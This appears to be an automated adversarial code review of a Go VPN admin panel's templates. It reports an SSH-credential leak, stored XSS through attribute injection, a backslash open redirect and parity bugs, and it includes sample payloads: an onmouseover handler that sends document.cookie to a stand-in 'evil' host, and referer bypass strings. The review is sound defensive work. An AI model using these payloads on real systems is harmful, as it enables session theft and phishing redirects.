# Code Review: Issue #383 — Templates, Static Assets & Web UI (Phase 7)

- **Reviewer**: dev_bot (senior adversarial review)
- **Date**: 2026-09-01
- **Scope**: Full diff of 19 files (+2334/−1462) in `amnezia-web-ui-go` (templates, template engine, static assets, i18n), traced end-to-end against handlers, DB layer, middleware, and the legacy Python implementation
- **Verification method**: Diff review + full call-chain tracing + legacy parity comparison + **empirical reproductions** (Go probes executed for template escaping semantics, HTML-parser tokenization probes for client-side escaping helpers, executed copies of `CleanReferer`/`IsValidLanguage`). `go build`, `go vet`, and `go test -race` on the template suite all re-run and pass — the compilation gate itself is clean. The findings below are design and content-level, which the gates cannot catch.

---

## Summary

* Overall risk: **CRITICAL**
* Findings: **11**
* Critical: **1**
* High: **1**
* Medium: **3**
* Low: **4**
* Info: **2**

---

## Findings

### 1. [CRITICAL] Decrypted SSH root credentials of all servers leaked to every regular user via `/my`

**Location:** `internal/handlers/pages.go:82` (`MyConnectionsPageHandler` passing `h.db.GetAllServers(ctx)`), `web/templates/my_connections.html:254` (`const availableServers = {{ .servers | json }};`), root cause in `internal/database/servers.go:352-357` (`scanServer` decrypts `ssh_pass`/`ssh_key` into the struct) and `internal/models/models.go:164-165` (`json:"ssh_pass,omitempty"` / `json:"ssh_key,omitempty"`).

**Problem:**
`MyConnectionsPageHandler` passes the raw output of `GetAllServers()` into `my_connections.html`. That output contains **decrypted** SSH passwords and private keys for every managed server. The template serializes it verbatim into an inline script: `const availableServers = {{ .servers | json }};`.

The legacy Python implementation this port is required to match (TASK.md: "100% parity") explicitly sanitized servers for this exact page — `app/routers/pages.py:102` calls `sanitize_server_for_user()`, which strips "host, IP, SSH credentials, private keys" and returns only `{id, name, protocols.installed, status, ...}`. The Go port dropped that sanitation entirely.

**Verification (executed, not inferred):**
```
Input to {{ .Servers | json }} in <script> context:
  [{"id":1,"name":"srv","ssh_key":"-----BEGIN RSA PRIVATE KEY-----","ssh_pass":"SECRETPASSWORD"}]
```
The exact `jsonFuncMap` helper from `internal/handlers/template.go` was run against a `models.Server` with credentials — the marshaled output contains the plaintext credentials, and `template.JS` in script context emits them raw.

**Failure scenario:**
1. Attacker registers as (or is provisioned as) a regular panel user — the lowest privilege role, which is exactly the audience `/my` serves (`RequireAuth`, not `RequireAdminOrSupport`).
2. Attacker opens `/my`, views page source, and reads `availableServers` — obtaining `host`, `ssh_user`, `ssh_port`, and the **decrypted** `ssh_pass` (or `ssh_key`) for every VPN server in the panel.
3. Attacker SSHes into the VPN servers as root. Full infrastructure compromise: WireGuard/MTProxy peer manipulation, private key exfiltration, pivot to other hosts.

**Impact:**
Total compromise of every managed VPN server by any registered user. This is the worst possible leak for a panel whose entire job is holding root credentials for customer servers.

**Recommended fix:**
In `MyConnectionsPageHandler` (and anywhere `servers` crosses to non-admin pages), map to a sanitized shape mirroring `sanitize_server_for_user`:

```go
type serverForUser struct {
    ID        int64                       `json:"id"`
    Name      string                      `json:"name"`
    Protocols map[string]map[string]bool `json:"protocols"` // only {"installed": bool}
}
```
Additionally, defense in depth: change `models.Server` json tags for `SSHPass`/`SSHKey` to `json:"-"` so credentials can never be serialized by accident, and add a regression test asserting that rendering `my_connections.html` with a credentialed server produces output containing **no** fragment of the password/key.

---

### 2. [HIGH] Stored XSS via attribute injection: `escapeHtml` does not escape quotes and `escapeJs` output is placed in double-quoted HTML attributes

**Location:**
- `web/templates/base.html:143-153` (definitions of `escapeHtml`/`escapeJs`)
- `web/templates/user_share.html:153`, `my_connections.html:387-395`, `server.html:1195` — `onclick="showConfig('${escapeJs(c.id)}', '${escapeJs(c.name || 'Connection')}')"`
- `web/templates/users.html:805` — `data-cname="${escapeHtml(c.name || 'VPN')}"`

**Problem:**
Connection names are fully user-controlled (`RenameConnectionRequest.Validate` at `internal/models/models.go:802-808` bans only null bytes and enforces length 1-255 — quotes, `<`, `>` are all permitted, and regular users rename their own connections via `/api/connections/{id}/rename`). These names are rendered into client-side-built HTML in two flawed patterns:

(a) `escapeHtml` is `div.textContent → div.innerHTML`, which escapes only `&`, `<`, `>` — **not quotes**. Placed inside a double-quoted attribute (`data-cname="..."`), a name containing `"` terminates the attribute.

(b) `escapeJs` escapes `"` to `\"` — a *JavaScript* escape that is meaningless to the *HTML tokenizer*. Placed inside `onclick="..."` (double-quoted attribute), the raw `"` still terminates the attribute; the backslash survives as a literal character.

**Verification (executed):**
Both helpers were reproduced exactly and the output tokenized with an HTML parser:
```
escapeJs('x" onmouseover=window.__pwned1=true//') inside onclick="..."
parsed attributes: onclick='showConfig(\'abc\', \'x\\'
                   onmouseover='window.__pwned1=true//\')"'    <-- injected handler

escapeHtml('y" onmouseover=window.__pwned2=true//') inside data-cname="..."
parsed attributes: data-cname='y'
                   onmouseover='window.__pwned2=true//"'      <-- injected handler
```
The injected `onmouseover` fires on hover. No CSP exists anywhere in the middleware stack to block inline handlers.

**Failure scenario:**
1. A regular user renames their connection to `x" onmouseover="fetch('//evil/'+document.cookie)` (or uses a no-interaction vector like `onanimationstart` with a CSS animation class).
2. An admin opens `/users`, clicks the user's connection count, or opens `/server/{id}` — `GetServerConnectionsHandler` merges `uc.Name` into the client payload (`server_connections.go:70-73`), and the name lands in `escapeJs(...)`-built `onclick` attributes and `escapeHtml`-built `data-cname` attributes. The admin's browser executes the payload.
3. Same-origin script runs with admin rights: the CSRF token is readable from the meta tag, so the script can call any admin API (add servers, create admins, download `/api/settings/backup/download`). It can also read the `serversData`/`availableServers` inline JSON — chaining directly with Finding 1 to exfiltrate SSH root credentials.
4. The same payload renders on the **public** `user_share.html` page (`showConfig('${escapeJs(c.id)}', '${escapeJs(c.name)}')`), so the user can also direct an admin to "check my share link" for the same effect.

**Impact:**
User → admin privilege escalation on a security-sensitive panel; combined with Finding 1, complete infrastructure takeover. Note this pattern is inherited from the legacy Jinja templates (legacy `templates/users.html:812` is identical), but the task mandate was "port, **harden**, and verify" — and QA_REVIEW.md §4.1 explicitly claims "XSS vectors ... are strictly entity-escaped and never executed raw," which is false in attribute contexts. The QA "fix" of applying `escapeHtml()`/`escapeJs()` to these sinks provides **false confidence** — it is exactly the insufficient escaping demonstrated above.

**Recommended fix:**
Stop interpolating data into inline `onclick` attributes. Put values in `data-` attributes and read them via `this.dataset` (the codebase already does this correctly in `users.html:467` for user data — replicate that pattern), or attach listeners via `addEventListener` with closures. If string-building must remain, fix the helpers: `escapeHtml` must also escape `"` and `'` (e.g., replace with `&quot;`/`&#39;`), and `escapeJs` must never be used in an HTML-attribute context. Add a regression test asserting that a connection named `x" onmouseover="pwn()` produces no `onmouseover` token in rendered output.

---

### 3. [MEDIUM] Leaderboard page always renders the empty state on first load — server-side data contract dropped

**Location:** `internal/handlers/pages.go:112-116` (`LeaderboardPageHandler` passes only `{"period": "all-time"}`), `web/templates/leaderboard.html:42` (`{{ if .entries }}` … else empty-state), `leaderboard.html:194-203` (DOMContentLoaded never fetches).

**Problem:**
The legacy handler (`app/routers/pages.py:134-162`) passes `entries`, `current_user_rank`, and `monthly_label` server-side, so the first paint shows the actual table and the user's rank badge. The Go handler passes **only** `period`. The template's `{{ if .entries }}` is therefore always false → the "leaderboard empty" placeholder renders; `{{ if .current_user_rank }}` is always false → the rank card shows `#—` and stays hidden; the DOMContentLoaded hook only updates button styling and never fetches. Data appears only after the user manually clicks a period button (`switchPeriod` short-circuits when `period === currentPeriod`, and `currentPeriod` starts as `"all-time"` — so clicking "All-time" does nothing; the user must switch to monthly and back).

**Failure scenario:**
Any user opens `/leaderboard` on a panel with hundreds of ranked users → sees "leaderboard_empty_title / leaderboard_empty_desc" and no personal rank. Looks broken.

**Impact:**
Functional parity regression; the page appears broken on every first load.

**Recommended fix:**
Pass `entries`, `current_user_rank`, and `monthly_label` from the handler by reusing the `GetLeaderboard` aggregation (or at minimum call `/api/leaderboard` from `DOMContentLoaded` for non-`all-time` initial states). Add a test rendering the page with a seeded leaderboard and asserting a seeded username appears in the HTML.

---

### 4. [MEDIUM] `user_share.html` ignores `.not_found` — invalid share tokens render a misleading live page instead of the legacy 404

**Location:** `internal/handlers/share.go:21-28` (passes `"not_found": true`), `web/templates/user_share.html` (no reference to `.not_found` anywhere).

**Problem:**
The legacy implementation returns a translated 404 page: "share_not_found / share_not_found_desc" (`app/routers/share.py:56-62`). The Go handler faithfully passes `not_found: true`, but the ported template never consumed it. A visitor with an invalid/expired token gets the full share UI: empty username header, then `loadConnections()` fetches `/api/share/{token}/connections`, which correctly returns 403 — but the client-side code only handles 401 (`if (res.status === 401) return;`), so it parses the 403 error JSON, finds no `connections`, and displays "no active connections" with a 200 status.

**Failure scenario:**
Admin disables a user's share; every distributed link now shows a working-looking portal claiming "no active connections" with HTTP 200 — users believe their config was deleted rather than the link revoked. Also breaks link-rot semantics for any monitoring tooling.

**Impact:**
Misleading UX and a legacy parity break in a security-adjacent flow (share link lifecycle). No data leak (the API enforces 403 correctly — verified `GetShareConnectionsHandler`).

**Recommended fix:**
Add `{{ if .not_found }}<h1>{{ _ "share_not_found" }}</h1>...{{ else }}...{{ end }}` to `user_share.html` and have the handler set `http.StatusNotFound` via a custom writer or a dedicated not-found template, matching legacy. Add a test asserting a bogus token yields the not-found copy.

---

### 5. [MEDIUM] `CleanReferer` backslash bypass → open redirect on `/set_lang/{lang}`

**Location:** `internal/handlers/template.go:769-792` (`CleanReferer`), consumed by `internal/handlers/auth.go:54-75` (`SetLangHandler` redirects to the cleaned referer).

**Problem:**
The rewritten sanitizer blocks `//`-prefixed referers, but not the `/` + `\` combination. **Verified by executing the exact copied function:**
```
CleanReferer("https://evil.com/\\evil.com") = "/\\evil.com"     (passes!)
CleanReferer("/%5Cevil.com")                = "/\\evil.com"     (passes!)
```
Browsers (WHATWG URL parsing) normalize `\` to `/` in special schemes, so `Location: /\evil.com` on `https://panel.com/...` resolves to `//evil.com` → `http://evil.com`. The QA adversarial suite (`template_test.go` "Adversarial CleanReferer Suite") tests `\\evil.com` (double backslash, correctly blocked) but misses the single-backslash-after-slash variant — which is precisely the classic bypass of `//`-only checks.

**Failure scenario:**
Attacker hosts a page at `https://attacker.com/%5Cattacker.com` and links to `https://panel.com/set_lang/ru`. The victim's browser sends `Referer: https://attacker.com/%5Cattacker.com`; `url.Parse` decodes `%5C` in `Path`, `CleanReferer` strips the host and returns `/\attacker.com`; `http.Redirect` issues `Location: /\attacker.com`; the victim's browser normalizes and lands on the attacker's site. This is directly usable for credential-phishing redirection off the panel domain (the panel is a VPN admin tool — high-value phishing target).

**Impact:**
Open redirect from the panel to an attacker-controlled host. The pre-existing version had a related flaw (raw pass-through of relative referers), so this is a *failed hardening* of an already-weak function rather than a brand-new class — but this diff rewrote the function and its test suite and claimed the vector closed.

**Recommended fix:**
After computing `path`, reject or sanitize backslashes: `if strings.Contains(path, "\\") { return def }` (or replace `\` with `/` then re-check the `//` prefix). Add regression cases: `{"https://evil.com/%5Cevil.com", "/", "/"}` and `{"/\\evil.com", "/", "/"}`.

---

### 6. [LOW] `?lang=RU` passes validation but is used unnormalized → silent English fallback

**Location:** `internal/handlers/template.go:543-555` (`NegotiateLocale` returns `qLang`/cookie value as-is after `IsValidLanguage`), `internal/config/config.go:290-297` (`IsValidLanguage` lowercases internally for the check only).

**Problem (verified):** `IsValidLanguage("RU")`, `IsValidLanguage(" ru ")`, `IsValidLanguage("Fa")` all return `true`, but `NegotiateLocale` returns the raw value. `allTranslations["RU"]` and `config.T("RU", ...)` then miss and fall back to English; `eq .lang "fa"` fails so Persian never gets `dir="rtl"` via the query param. Cookie values are safe (`SetLangHandler` normalizes), so only the `?lang=` path is affected.

**Failure scenario:** A user bookmarks `/my?lang=RU` → entire UI silently renders in English (and `fa` loses RTL).

**Fix:** Normalize before use in `NegotiateLocale`: `qLang = strings.ToLower(strings.TrimSpace(qLang))` (same for cookie values). Add `NegotiateLocale("/?lang=RU") == "ru"` test.

---

### 7. [LOW] Per-request `tmpl.Clone()` plus 3-4 uncached DB queries on every page render

**Location:** `internal/handlers/template.go:662` (Clone per render), `template.go:593` (`GetUser` per render), `template.go:614-624` (`GetSetting` for appearance + captcha), `template.go:561` (`GetSetting` again inside `NegotiateLocale` when no cookie).

**Problem:**
Every `RenderTemplate` call deep-clones the full template tree (base + page, all defines) and issues up to four SQLite queries (session user, appearance in `NegotiateLocale`, appearance again in `RenderTemplate` — note appearance may be fetched **twice** per render — plus captcha), all under the DB's RWMutex. `appearance` and `captcha` change only via the settings page; they are fetched per request.

**Failure scenario:** Under modest concurrency (dozens of page views/sec) on a low-spec VPS (the typical Amnezia deployment target), render latency and allocator pressure scale unnecessarily; the double `GetSetting("appearance")` doubles the settings-table contention.

**Fix:** Cache per-language template clones at load time (5 languages × 11 templates = 55 pre-cloned trees bound to fixed funcs — eliminates the Clone entirely), and cache appearance/captcha settings in memory with a short TTL or invalidation on save. Correctness is unaffected today; this is capacity hygiene, not a bug.

---

### 8. [LOW] Template engine initialization swallows parse failures → permanently broken panel with only a log line

**Location:** `internal/handlers/template.go:44-46` (`engineOnce.Do` logs `loadTemplates` error and continues).

**Problem:**
Templates are embedded at build time; a parse failure means a shipped defect. With this code the process starts "successfully," every page returns 404 `Template Not Found`, and the only signal is one startup log line. Also, `ReloadTemplates` (currently dead code — no callers) mutates `te.templates` in place template-by-template, so a mid-reload parse failure leaves a mix of old and new versions.

**Failure scenario:** A future template edit introduces a syntax error; CI (which runs tests, and the current tests *do* exercise parsing) would catch it — but a deployment path that skips tests ships a fully-dark panel that still reports healthy on `/api/health`.

**Fix:** Fail fast: return the error from `GetTemplateEngine` (or panic) so startup fails loudly. Make `ReloadTemplates` build into a fresh map and swap atomically on full success.

---

### 9. [LOW] `showToast` injects server-derived messages via `innerHTML`

**Location:** `web/templates/base.html:215` — `toast.innerHTML = \`<span>...</span> <span>${message}</span>\`;`, reached with `err.message` at `index.html:198,214`, `settings.html:458`, `users.html:996`, `server.html:1549` etc.

**Problem:**
`apiCall` builds `err.message` from `data.error || data.message`. Today those fields carry static error codes (`invalid_protocol`, `duplicate_name`, …) and `WriteJSONError` puts dynamic content only in the `detail` field, which `apiCall` never reads — so **no exploit could be constructed with current handlers**; this is not currently reachable with attacker-controlled HTML. However, the sink is an `innerHTML` with a message that any future handler populating `message` (or a typo'd `detail` passthrough) turns into stored/reflected XSS, and Finding 2 demonstrates how easily this class slips through. Low severity, high leverage as defense-in-depth.

**Fix:** Use `textContent` for the message span, or route messages through `escapeHtml`.

---

### 10. [INFO] Dead/oversized template surface never exercised by any template

**Location:** `internal/handlers/template.go:652` (`all_translations_json` built into every render context, ~105KB marshaled per request — `web/translations/` totals 104,830 bytes — but no template references it), `template.go:338-350` (`default` helper fires on any falsy value — `false`, `0` — unlike Jinja's undefined-only semantics), `template.go:380-389` (`seq` allocates unbounded slices; unused).

Not defects, but per-render JSON marshaling of 105KB that no consumer reads is pure waste (compounds Finding 7), and helpers whose semantics differ from the Jinja originals they replace are latent parity traps if templates later adopt them. Consider pruning or aligning semantics.

---

### 11. [INFO] Pre-existing (Phase 5 router, not this diff): `/leaderboard` and `/api/leaderboard` are public, legacy requires authentication

**Location:** `internal/router/router.go:123` (`r.Get("/leaderboard", ...)` in the public group), `router.go:258` (`/api/leaderboard` public), vs. legacy `app/routers/leaderboard.py:15` (`Depends(get_current_user)` on the API) and `app/routers/pages.py:135` (page).

Anonymous visitors can enumerate all usernames and their traffic volumes. This predates the reviewed diff, so it is not counted against this change — but since this diff owns the leaderboard page rendering and its parity claim, it should be routed to a follow-up issue.

---

## Questions / Uncertainties

1. **`UserGetMyConnectionsHandler`** (`/api/connections`) enriches with only `server_name` — confirmed it does *not* leak credentials; the leak is exclusively the `/my` page's inline `{{ .servers | json }}`. If any other consumer (mobile client, CLI) renders `/my` HTML, Finding 1 applies to them as well.
2. No live browser session was available in the review environment (browser daemon unavailable), so the attribute-injection PoC in Finding 2 was validated by reproducing both escape helpers byte-for-byte and tokenizing the resulting HTML with an HTML parser — equivalent evidence for tokenizer behavior, but a real browser was not observed executing the injected handler.
3. Whether `GetAllSettings` decrypts `sync.remnawave_api_key` at rest: `settings.html` renders it into the API-key input for admins, exactly as legacy does (`templates/settings.html:172`), so this is treated as accepted parity and was not flagged.
4. `ReloadTemplates` has no callers in the codebase; its partial-swap behavior is flagged (Finding 8) but it is currently dead code.

---

## Final Assessment

**DO NOT MERGE.**

The compilation gate genuinely passes, and the template isolation architecture (per-page parse trees, per-request clone for locale funcs) is sound and race-clean — but this diff is the moment the templates went from inert text to live HTML interpolation, and it activates two severe problems the automated gates structurally cannot see: decrypted SSH root credentials for every server rendered into a page any regular user can view, and user-controlled connection names breaking out of double-quoted attributes despite the `escapeHtml`/`escapeJs` "fixes" that QA explicitly certified as XSS protection. The QA verdict of APPROVED is contradicted by concrete, minimal reproductions for both the credential leak and the escaping bypass, so its sign-off should not be relied upon for this phase. Findings 1, 2, and 5 must be fixed (with the proposed regression tests: credential-redaction render test, attribute-injection test, and single-backslash `CleanReferer` cases) and Findings 3-4 restored for parity before this is re-audited; the remaining LOW/INFO items can ride along or follow.